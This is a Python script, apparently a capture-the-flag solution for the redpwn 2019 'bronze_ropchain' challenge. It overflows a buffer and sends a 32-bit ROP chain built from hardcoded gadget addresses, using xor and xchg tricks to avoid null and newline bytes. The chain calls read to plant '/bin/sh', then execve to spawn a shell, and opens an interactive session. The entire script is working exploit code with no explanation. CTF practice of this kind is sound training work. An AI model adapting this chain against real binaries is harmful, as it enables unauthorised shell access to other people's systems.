from ptrlib import *

sock = Socket("chall2.2019.redpwn.net", 4004)
#sock = Process("./bronze_ropchain")
elf = ELF("./bronze_ropchain")

elf_base = 0x8048000
#rop_pop_eax = 0x080a8e86
rop_xor_eax_81fffb22 = 0x08096547
rop_pop_ebx = 0x080481c9
rop_pop_edx = 0x0806ef2b
rop_xchg_eax_ebx = 0x0804a2eb
rop_xchg_eax_edx = 0x0808286a
rop_xchg_eax_edi = 0x08077541
rop_pop_ecx_ebx = 0x0806ef52
rop_int80 = 0x0806f860
rop_inc_ecx = 0x080c4b74
var = elf.section(".bss") + 0x100

payload = b"A" * 0x1c

## read(0, var, 8)
# ecx = var
payload += p32(rop_pop_ecx_ebx)
payload += p32(var)
payload += p32(0xdeadbeef)
# ebx = 0
payload += p32(rop_pop_edx)
payload += p32(0x81fffb22)
payload += p32(rop_xchg_eax_edx)
payload += p32(rop_xor_eax_81fffb22)
payload += p32(rop_xchg_eax_ebx)
# eax = 3
payload += p32(rop_pop_edx)
payload += p32(0x81fffb22 ^ 0x03)
payload += p32(rop_xchg_eax_edx)
payload += p32(rop_xor_eax_81fffb22)
payload += p32(rop_xchg_eax_edi)
# edx = 8
payload += p32(rop_pop_edx)
payload += p32(0x81fffb22 ^ 0x08)
payload += p32(rop_xchg_eax_edx)
payload += p32(rop_xor_eax_81fffb22)
payload += p32(rop_xchg_eax_edx)
# int 0x80
payload += p32(rop_xchg_eax_edi)
payload += p32(rop_int80)

## execve(var, 0, 0)
# ecx = 0
payload += p32(rop_pop_ecx_ebx)
payload += p32(0xffffffff)
payload += p32(0xdedabeef)
payload += p32(rop_inc_ecx)
# ebx = 'sh\x00'
payload += p32(rop_pop_ebx)
payload += p32(var)
# eax = 0x0b (execve)
payload += p32(rop_pop_edx)
payload += p32(0x81fffb22 ^ 0x0b)
payload += p32(rop_xchg_eax_edx)
payload += p32(rop_xor_eax_81fffb22)
payload += p32(rop_xchg_eax_edi)
# edx = 0
payload += p32(rop_pop_edx)
payload += p32(0x81fffb22)
payload += p32(rop_xchg_eax_edx)
payload += p32(rop_xor_eax_81fffb22)
payload += p32(rop_xchg_eax_edx)
# int 0x80
payload += p32(rop_xchg_eax_edi)
payload += p32(rop_int80)
payload += b"AAAA"
print(payload)
assert b'\n' not in payload
assert b'\0' not in payload

#_ = input()
sock.sendlineafter("name?\n", payload)
sock.sendlineafter("day?\n", "")

sock.send("/bin/sh\x00")

sock.interactive()
